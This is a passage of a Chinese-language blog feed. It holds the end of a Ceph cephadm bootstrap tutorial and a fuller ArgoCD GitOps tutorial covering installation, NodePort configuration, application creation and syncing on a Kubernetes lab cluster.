class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# mv cephadm <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span><br>[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# <br>[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# chmod <span class="hljs-operator">+</span>x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>cephadm <br>[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# <br>[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>l <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>cephadm<br><span class="hljs-operator">-</span>rwxr<span class="hljs-operator">-</span>xr<span class="hljs-operator">-</span>x <span class="hljs-number">1</span> root root <span class="hljs-number">215316</span> <span class="hljs-type">Aug</span> <span class="hljs-number">20</span> <span class="hljs-number">22</span>:<span class="hljs-number">19</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>cephadm<br></code></pre></td></tr></table></figure><p> <strong>创建新集群</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">[root@ceph141 ~]<span class="hljs-comment"># cephadm bootstrap --mon-ip 10.0.0.141 --cluster-network 10.0.0.0/24 --allow-fqdn-hostname</span><br>Creating directory <span class="hljs-string">/etc/ceph</span> for ceph.conf<br>Verifying podman|docker is present.<span class="hljs-string">..</span><br>Verifying lvm2 is present.<span class="hljs-string">..</span><br><span class="hljs-string">...</span><br>Generating a dashboard self-signed certificate.<span class="hljs-string">..</span><br>Creating initial admin user.<span class="hljs-string">..</span><br>Fetching dashboard port number.<span class="hljs-string">..</span><br>Ceph Dashboard is now available at:<br><br><span class="hljs-comment">#访问的url，账号，密码</span><br>     URL: https:<span class="hljs-string">//ceph141</span><span class="hljs-function">:8443</span>/<br>    User: admin        <br>Password: s3o1ou58iy<br><br>Enabling client.admin keyring and conf on hosts with <span class="hljs-string">&quot;admin&quot;</span> label<br></code></pre></td></tr></table></figure><p> <strong>查看docker镜像</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/20434c5525c6446bab47ddf615323b83.png" alt="img"></p><p><strong>登录dashbod</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4ae5a691f6e9475daad597f3f5f27df5.png" alt="img"></p><p><strong>查看节点信息</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/3c11920a7a494e2fb3fee931d9ea4653.png" alt="img"></p><p>参考地址：<a href="https://www.cuiliangblog.cn/">https://www.cuiliangblog.cn/</a></p><p>ceph的官方文档: <a href="https://docs.ceph.com/en/latest/">https://docs.ceph.com/en/latest/</a><br> 官方架构图: <a href="https://docs.ceph.com/en/latest/architecture/">https://docs.ceph.com/en/latest/architecture/</a>     </p>]]></content>
    
    
    <categories>
      
      <category>存储篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ceph</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在K8S中使用ArgoCD做持续部署</title>
    <link href="/2025/04/18/%E5%9C%A8K8S%E4%B8%AD%E4%BD%BF%E7%94%A8ArgoCD%E5%81%9A%E6%8C%81%E7%BB%AD%E9%83%A8%E7%BD%B2/"/>
    <url>/2025/04/18/%E5%9C%A8K8S%E4%B8%AD%E4%BD%BF%E7%94%A8ArgoCD%E5%81%9A%E6%8C%81%E7%BB%AD%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="一、了解argocd"><a href="#一、了解argocd" class="headerlink" title="一、了解argocd"></a>一、了解argocd</h2><p>ArgoCD是一个基于Kubernetes的GitOps持续交付工具，应用的部署和更新都可以在Git仓库上同步实现，并自带一个可视化界面。本文介绍如何使用Git+Argocd方式来实现在k8s中部署和更新应用服务。关于ci这一块这里不多介绍。主要讲解argocd如何实现cd持续部署。在开始前，需要部署一套k8s集群，可参考本文连接：<a href="https://blog.csdn.net/m0_69326428/article/details/144375315?spm=1011.2415.3001.5331">https://blog.csdn.net/m0_69326428/article/details/144375315?spm=1011.2415.3001.5331</a></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/b819ac46c7674fa5b52da3668eac0397.png" alt="在这里插入图片描述"></p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>ArgoCD 的核心理念是 GitOps，即以 Git 仓库作为单一的真理源，通过自动化的方式将仓库中的应用配置同步到 Kubernetes 集群中。</p><ol><li><strong>定义应用</strong>: 用户在 Git 仓库中定义应用的 Kubernetes 资源清单，并将这些清单文件提交到 Git 仓库。</li><li><strong>创建 ArgoCD Application</strong>: 在 ArgoCD 中创建一个 <code>Application</code> 资源，该资源描述了应用在 Git 仓库中的位置，以及在 Kubernetes 集群中部署的位置。</li><li><strong>同步状态监控</strong>: ArgoCD Controller 持续监控 Git 仓库中的配置，并与当前集群状态进行对比。每次检测到 Git 仓库中的应用配置发生变化时，Controller 会自动更新集群中的资源，保持与 Git 仓库的一致性。</li><li><strong>自动同步与手动同步</strong>: ArgoCD 支持自动同步和手动同步。自动同步模式下，一旦检测到 Git 仓库有变化，ArgoCD 会自动更新 Kubernetes 集群中的资源。而在手动同步模式下，用户需要手动触发同步操作。</li><li><strong>回滚功能</strong>: 如果应用更新导致问题，ArgoCD 提供了回滚功能，用户可以轻松恢复到先前的状态</li></ol><p>CD 流水线有两种模式：Push 和 Pull</p><h3 id="Push-模式"><a href="#Push-模式" class="headerlink" title="Push 模式"></a>Push 模式</h3><p>目前大多数 CI&#x2F;CD 工具都使用基于 Push 的部署模式，例如 Jenkins。这种模式一般都会在 CI 流水线运行完成后执行一个命令（比如 kubectl）将应用部署到目标环境中。</p><p>这种 CD 模式的缺陷很明显：</p><p>需要在环境安装配置额外管理工具（比如 kubectl）；<br>需要 Kubernetes 对其进行授权；<br>需要云平台授权；<br>无法感知部署状态。也就无法感知期望状态与实际状态的偏差，需要借助额外的方案来保障一致性。<br>Kubernetes 集群或者云平台对 CI 系统的授权凭证在集群或云平台的信任域之外，不受集群或云平台的安全策略保护，因此 CI 系统很容易被当成非法攻击的载体。</p><h3 id="Pull-模式"><a href="#Pull-模式" class="headerlink" title="Pull 模式"></a>Pull 模式</h3><p>Pull 模式会在目标环境中安装一个 Agent，例如在 Kubernetes 集群中就靠 Operator 来充当这个 Agent。Operator 会周期性地监控目标环境的实际状态，并与 Git 仓库中的期望状态进行比较，如果实际状态不符合期望状态，Operator 就会更新基础设施的实际状态以匹配期望状态。</p><p>只有 Git 的变更可以作为期望状态的唯一来源，除此之外，任何人都不可以对集群进行任何更改，即使你修改了，也会被 Operator 还原为期望状态，这也就是传说中的不可变基础设施。</p><p>目前基于 Pull 模式的 CD 工具有 Argo CD，Flux CD 以及 ks-devops。</p><h2 id="二、部署argocd"><a href="#二、部署argocd" class="headerlink" title="二、部署argocd"></a>二、部署argocd</h2><p>github地址：<a href="https://github.com/argoproj/argo-cd">https://github.com/argoproj/argo-cd</a></p><p><strong>准备环境</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#下载argocd client</span><br>wget https://github.com/argoproj/argo-cd/releases/download/v2.12.7/argocd-linux-amd64<br><br><span class="hljs-comment">#权限</span><br><span class="hljs-built_in">chmod</span> u+x argocd-linux-amd64<br><br><span class="hljs-comment">#移动可执行目录</span><br><span class="hljs-built_in">mv</span> ./argocd-linux-amd64 /usr/local/bin/argocd<br><br><span class="hljs-comment">#验证 </span><br>argo version<br><br><span class="hljs-comment">#准备yaml文件</span><br>wget https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml<br></code></pre></td></tr></table></figure><p><strong>修改svc类型</strong></p><p>为了方便测试。将svc类型改成NodePort。实际工作中建议使用ingress</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# vim install.yaml<br>...<br>apiVersion: v1<br>kind: Service<br>metadata:<br>  labels:<br>    app.kubernetes.io/component: server<br>    app.kubernetes.io/name: argocd-server<br>    app.kubernetes.io/part-of: argocd<br>  name: argocd-server<br>spec:<br>  <span class="hljs-comment"># 增加 type: NodePort</span><br>  <span class="hljs-built_in">type</span>: NodePort<br>  ports:<br>  - name: http<br>    port: 80<br>    <span class="hljs-comment"># 该位置增加访问端口 300xxx (30000-32000)任意 我们设置成30080</span><br>    nodePort: 30080<br>    protocol: TCP<br>    targetPort: 8080<br>  - name: https<br>    port: 443<br>    protocol: TCP<br>    targetPort: 8080<br>  selector:<br>    app.kubernetes.io/name: argocd-server<br>...<br></code></pre></td></tr></table></figure><p><strong>部署</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl create namespace argocd<br>kubectl apply -n argocd -f install.yaml<br></code></pre></td></tr></table></figure><p><strong>查看pod状态</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl get all -n argocd<br></code></pre></td></tr></table></figure><p><strong>访问</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://10.0.0.231:30080/login<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a659614bebb341bdbaf3996b043b77a0.png" alt="在这里插入图片描述"></p><p><strong>查看密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath=<span class="hljs-string">&quot;&#123;.data.password&#125;&quot;</span> | <span class="hljs-built_in">base64</span> -d; <span class="hljs-built_in">echo</span><br>密码：****  <br>账号：admin<br></code></pre></td></tr></table></figure><p><strong>argocd客户端命令行工具修改密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 bin]# argocd login 10.0.0.231:30080<br>WARNING: server certificate had error: tls: failed to verify certificate: x509: cannot validate certificate <span class="hljs-keyword">for</span> 10.0.0.231 because it doesn<span class="hljs-string">&#x27;t contain any IP SANs. Proceed insecurely (y/n)? y</span><br><span class="hljs-string">Username: admin</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">&#x27;</span>admin:login<span class="hljs-string">&#x27; logged in successfully</span><br><span class="hljs-string">Context &#x27;</span>10.0.0.231:30080<span class="hljs-string">&#x27; updated</span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@master231 bin]# argocd account update-password</span><br><span class="hljs-string">*** Enter password of currently logged in user (admin): </span><br><span class="hljs-string">*** Enter new password for user admin: </span><br><span class="hljs-string">*** Confirm new password for user admin: </span><br><span class="hljs-string">Password updated</span><br><span class="hljs-string">Context &#x27;</span>10.0.0.231:30080<span class="hljs-string">&#x27; updated</span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@lc-master-1 ~]# argocd logout  192.168.0.71:8082</span><br><span class="hljs-string">Logged out from &#x27;</span>192.168.0.71:8082<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[root@master231 bin]# argocd login 10.0.0.231:30080</span><br><span class="hljs-string">WARNING: server certificate had error: tls: failed to verify certificate: x509: cannot validate certificate for 10.0.0.231 because it doesn&#x27;</span>t contain any IP SANs. Proceed insecurely (y/n)? y<br>Username: admin<br>Password: <br><span class="hljs-string">&#x27;admin:login&#x27;</span> logged <span class="hljs-keyword">in</span> successfully<br>Context <span class="hljs-string">&#x27;10.0.0.231:30080&#x27;</span> updated<br><br></code></pre></td></tr></table></figure><h2 id="三、web界面介绍"><a href="#三、web界面介绍" class="headerlink" title="三、web界面介绍"></a>三、web界面介绍</h2><h3 id="设置介绍"><a href="#设置介绍" class="headerlink" title="设置介绍"></a><strong>设置介绍</strong></h3><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/fb09126f952b41dfa43415c39f4e38f5.png" alt="在这里插入图片描述"></p><h3 id="添加仓库地址"><a href="#添加仓库地址" class="headerlink" title="添加仓库地址"></a><strong>添加仓库地址</strong></h3><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/21dfe8d196044229ac7c1e1b7ef9a211.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/17d2ef035c4047f8870a530c6ae199fe.png" alt="在这里插入图片描述"></p><p>添加成功</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4b752038d5c24eba9feb7de5d3e08a98.png" alt="在这里插入图片描述"></p><h2 id="四、创建应用"><a href="#四、创建应用" class="headerlink" title="四、创建应用"></a>四、创建应用</h2><h3 id="通过-CLI-来创建应用"><a href="#通过-CLI-来创建应用" class="headerlink" title="通过 CLI 来创建应用"></a>通过 CLI 来创建应用</h3><p>在仓库<a href="https://gitee.com/ljh00928/test_cherry%E9%87%8C%E6%9C%89%E4%B8%AAapp%E7%9B%AE%E5%BD%95%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%AA">https://gitee.com/ljh00928/test_cherry里有个app目录，里面有个</a> <a href="https://gitee.com/zouzou_busy/devops_test/blob/master/app/myapp-deployment.yaml?spm=a2c6h.13046898.publish-article.13.25876ffa0ywKH4&file=myapp-deployment.yaml">myapp-deployment.yaml</a> 文件 和 <a href="https://gitee.com/zouzou_busy/devops_test/blob/master/app/myapp-service.yaml?spm=a2c6h.13046898.publish-article.14.25876ffa0ywKH4&file=myapp-service.yaml">myapp-service.yaml</a> 文件，用来演示我们 argo cd 的功能</p><p>myapp-deployment.yaml </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: myapp<br>spec:<br>  replicas: 1<br>  selector:<br>    matchLabels:<br>      app: myapp<br>  template:<br>    metadata:<br>      labels:<br>        app: myapp<br>        <span class="hljs-built_in">test</span>: c1<br>    spec:<br>      containers:<br>      - image: yankay/dao-2048:latest<br>        name: myapp<br>        ports:<br>        - containerPort: 8008<br></code></pre></td></tr></table></figure><p>myapp-service.yaml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: v1<br>kind: Service<br>metadata:<br>  name: myapp-svc<br>spec:<br>  ports:<br>  - port: 8009<br>    targetPort: 8009<br>  <span class="hljs-built_in">type</span>: NodePort<br>  selector:<br>    app: myapp<br></code></pre></td></tr></table></figure><p>创建应用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看帮助手册</span><br>argocd app create --<span class="hljs-built_in">help</span><br><br><span class="hljs-comment">#部署应用</span><br>argocd app create app01 --repo https://gitee.com/ljh00928/test_cherry.git --path app --dest-server https://kubernetes.default.svc --dest-namespace demo1<br></code></pre></td></tr></table></figure><h3 id="通过-UI-创建应用"><a href="#通过-UI-创建应用" class="headerlink" title="通过 UI 创建应用"></a>通过 UI 创建应用</h3><p>同步策略：</p><p>自动同步允许 Argo CD 自动将 Git 仓库中的应用程序状态同步到 Kubernetes 集群中。</p><p>手动同步要求用户通过 Argo CD UI 或 CLI 手动触发同步操作。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/fa2f42bc21b64d08bfb9473796e45113.png" alt="在这里插入图片描述"></p><p>由于 Argo CD 支持部署应用到多集群，所以如果你要将应用部署到外部集群的时候，需要先将外部集群的认证信息注册到 Argo CD 中，如果是在内部部署（运行 Argo CD 的同一个集群，默认不需要配置），直接使用 <code>https://kubernetes.default.svc</code> 作为应用的 K8S APIServer 地址即可。</p><p>首先列出当前 <code>kubeconfig</code> 中的所有集群上下文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# kubectl config get-contexts <br>CURRENT   NAME                          CLUSTER      AUTHINFO           NAMESPACE<br>*         kubernetes-admin@kubernetes   kubernetes   kubernetes-admin    orbstack<br></code></pre></td></tr></table></figure><p>从列表中选择一个上下文名称并将其提供给 <code>argocd cluster add CONTEXTNAME</code>，比如对于 <code>orbstack</code> 上下文，运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# argocd cluster list<br>SERVER                          NAME        VERSION  STATUS      MESSAGE  PROJECT<br>https://kubernetes.default.svc  in-cluster  1.23     Successf]ul<br><br>argocd cluster add orbstack<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/3e7e3fcd71bd4a4fab48065455fd8230.png" alt="在这里插入图片描述"></p><p>查看yaml文件</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/537b8072b9ee45b58fe05f53d88c8cfc.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: argoproj.io/v1alpha1<br>kind: Application<br>metadata:<br>  name: app02<br>spec:<br>  destination:<br>    name: <span class="hljs-string">&#x27;&#x27;</span><br>    namespace: demo2<br>    server: <span class="hljs-string">&#x27;https://kubernetes.default.svc&#x27;</span><br>  <span class="hljs-built_in">source</span>:<br>    path: app<br>    repoURL: <span class="hljs-string">&#x27;https://gitee.com/ljh00928/test_cherry.git&#x27;</span><br>    targetRevision: HEAD<br>  project: default<br>  syncPolicy:<br>    automated: null<br>    syncOptions:<br>      - CreateNamespace=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>填写完以上信息后，点击页面左上方的 Create 安装，即可创建 app02 应用，创建完成后可以看到当前应用的处于 <code>OutOfSync</code> 状态：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d4a267c8db484a7589b621c7271df127.png" alt="在这里插入图片描述"></p><p>&#x3D;&#x3D;Argo CD 默认情况下每 3 分钟会检测 Git 仓库一次，用于判断应用实际状态是否和 Git 中声明的期望状态一致，如果不一致，状态就转换为 OutOfSync。默认情况下并不会触发更新，除非通过 syncPolicy 配置了自动同步&#x3D;&#x3D;</p><p><strong>SYNC OPTIONS（同步策略）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">spec:<br>  syncPolicy:<br>    syncOptions:<br>    - Validate=<span class="hljs-literal">false</span><br>    - CreateNamespace=<span class="hljs-literal">true</span><br>    - PruneLast=<span class="hljs-literal">true</span><br>    - ApplyOutOfSyncOnly=<span class="hljs-literal">true</span><br>    - Replace=<span class="hljs-literal">false</span><br>    - SkipDryRunOnMissingResource=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>常见的同步选项包括：</p><ul><li><code>Validate=false</code>: 禁用资源的服务器端验证。这在某些自定义资源（CRD）可能尚未完全定义时非常有用。</li><li><code>CreateNamespace=true</code>: 如果命名空间不存在，自动创建它。</li><li><code>PruneLast=true</code>: 在同步过程中最后执行 <code>prune</code> 操作，以确保所有资源已经创建。</li><li><code>ApplyOutOfSyncOnly=true</code>: 仅应用那些状态不同步的资源。</li><li><code>Replace=false</code>: 使用 <code>kubectl apply</code> 而不是 <code>kubectl replace</code> 来更新资源。</li><li><code>SkipDryRunOnMissingResource=true</code>: 在资源缺失时跳过 <code>dry-run</code> 检查</li></ul><h2 id="五、部署应用"><a href="#五、部署应用" class="headerlink" title="五、部署应用"></a>五、部署应用</h2><p>上面我们创建好了应用，但还没有部署，所以 namespace、pod、deployment、svc 都没有</p><h3 id="使用-CLI-同步"><a href="#使用-CLI-同步" class="headerlink" title="使用 CLI 同步"></a>使用 CLI 同步</h3><p>应用创建完成后，我们可以通过如下所示命令查看其状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# argocd app get app01<br>Name:               argocd/app01   <span class="hljs-comment">#应用名称</span><br>Project:            default<br>Server:             https://kubernetes.default.svc  <span class="hljs-comment">#部署的服务</span><br>Namespace:          demo1  <span class="hljs-comment">#部署的ns</span><br>URL:                https://10.0.0.231:30080/applications/app01 <br>Source:<br>- Repo:             https://gitee.com/ljh00928/test_cherry.git  <span class="hljs-comment">#资源仓库</span><br>  Target:           <br>  Path:             app   <span class="hljs-comment">#仓库里的资源路径</span><br>SyncWindow:         Sync Allowed<br>Sync Policy:        Manual<br>Sync Status:        OutOfSync from  (30c6f26)  <span class="hljs-comment">#仓库里的资源路径</span><br>Health Status:      Missing  <span class="hljs-comment">#健康状态</span><br><br>GROUP  KIND        NAMESPACE  NAME       STATUS     HEALTH   HOOK  MESSAGE<br>       Service     demo1      myapp-svc  OutOfSync  Missing        <br>apps   Deployment  demo1      myapp      OutOfSync  Missin<br></code></pre></td></tr></table></figure><p>因为 app01 是我们通过命名行创建的，ns 写的是 demo1，没有设置自动创建。如果你集群上没有这个命名空间，需要先手动创建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 ~]# kubectl create ns demo1<br>namespace/demo1 created<br></code></pre></td></tr></table></figure><p>应用程序状态为初始 <code>OutOfSync</code> 状态，因为应用程序尚未部署，并且尚未创建任何 Kubernetes 资源。要同步（部署）应用程序，可以执行如下所示命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#同步应用app01</span><br>[root@master231 ~]# argocd app <span class="hljs-built_in">sync</span> app01<br>TIMESTAMP                  GROUP        KIND   NAMESPACE                  NAME    STATUS    HEALTH        HOOK  MESSAGE<br>2025-03-25T15:12:33+08:00            Service       demo1             myapp-svc  OutOfSync  Missing              <br>2025-03-25T15:12:33+08:00   apps  Deployment       demo1                 myapp  OutOfSync  Missing              <br>2025-03-25T15:12:33+08:00            Service       demo1             myapp-svc    Synced  Healthy              <br>2025-03-25T15:12:33+08:00            Service       demo1             myapp-svc    Synced   Healthy              service/myapp-svc created<br>2025-03-25T15:12:33+08:00   apps  Deployment       demo1                 myapp  OutOfSync  Missing              deployment.apps/myapp created<br>2025-03-25T15:12:33+08:00   apps  Deployment       demo1                 myapp    Synced  Progressing              deployment.apps/myapp created<br><br>Name:               argocd/app01<br>Project:            default<br>Server:             https://kubernetes.default.svc<br>Namespace:          demo1<br>URL:                https://10.0.0.231:30080/applications/app01<br>Source:<br>- Repo:             https://gitee.com/ljh00928/test_cherry.git<br>  Target:           <br>  Path:             app<br>SyncWindow:         Sync Allowed<br>Sync Policy:        Manual<br>Sync Status:        Synced to  (30c6f26)<br>Health Status:      Progressing<br><br>Operation:          Sync<br>Sync Revision:      30c6f26bc59ce7f0605caac7c43e5316c55c89ce<br>Phase:              Succeeded<br>Start:              2025-03-25 15:12:33 +0800 CST<br>Finished:           2025-03-25 15:12:33 +0800 CST<br>Duration:           0s<br>Message:            successfully synced (all tasks run)<br><br>GROUP  KIND        NAMESPACE  NAME       STATUS  HEALTH       HOOK  MESSAGE<br>       Service     demo1      myapp-svc  Synced  Healthy            service/myapp-svc created<br>apps   Deployment  demo1      myapp      Synced  Progressing        deployment.apps/myapp created<br></code></pre></td></tr></table></figure><p>此命令从 Git 仓库中检索资源清单并执行 <code>kubectl apply</code> 部署应用，执行上面命令后 guestbook 应用便会运行在集群中了，现在我们就可以查看其资源组件、日志、事件和评估其健康状态了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#再次查看app01状态</span><br>[root@master231 ~]# argocd app get app01<br>Name:               argocd/app01<br>Project:            default<br>Server:             https://kubernetes.default.svc<br>Namespace:          demo1<br>URL:                https://10.0.0.231:30080/applications/app01<br>Source:<br>- Repo:             https://gitee.com/ljh00928/test_cherry.git<br>  Target:           <br>  Path:             app<br>SyncWindow:         Sync Allowed<br>Sync Policy:        Manual<br>Sync Status:        Synced to  (30c6f26)<br>Health Status:      Progressing   <span class="hljs-comment">#状态为 Progressing（进行中）了</span><br><br>GROUP  KIND        NAMESPACE  NAME       STATUS  HEALTH       HOOK  MESSAGE<br>       Service     demo1      myapp-svc  Synced  Healthy            service/myapp-svc created<br>apps   Deployment  demo1      myapp      Synced  Progressing        deployment.apps/myapp created<br></code></pre></td></tr></table></figure><p>等一会在去查看状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 